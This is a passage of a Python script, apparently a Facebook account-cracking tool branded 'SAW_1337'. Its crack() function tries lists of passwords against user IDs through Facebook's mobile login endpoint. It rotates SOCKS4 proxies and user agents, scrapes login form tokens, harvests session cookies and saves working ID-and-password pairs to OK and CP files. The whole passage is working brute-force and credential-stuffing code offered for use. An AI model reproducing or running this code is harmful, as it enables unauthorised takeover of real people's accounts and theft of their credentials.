				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()
# Mobile

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \033[0m[\x1b[1;96mSAW_1337\033[0m] \033[1;37m {P}{loop}\033[1;31m/{h}{len(id)}{P} OK:{h}{ok} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsaw)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				print(f'\r\033[1;31m[SAW-CP] {idf}|{pw}{N}')       
				open('CP/'+cpc,'a').write('\n'+idf+'|'+pw)
				akun.append(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m[SAW-OK] {idf}|{pw} {N}')
				#saw
				open('OK/'+okc,'a').write('\n'+idf+'|'+pw)
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r[SAW-OK] {idf}|{pw} ')
				open('OK/'+okc,'a').write('\n'+idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	SAWx()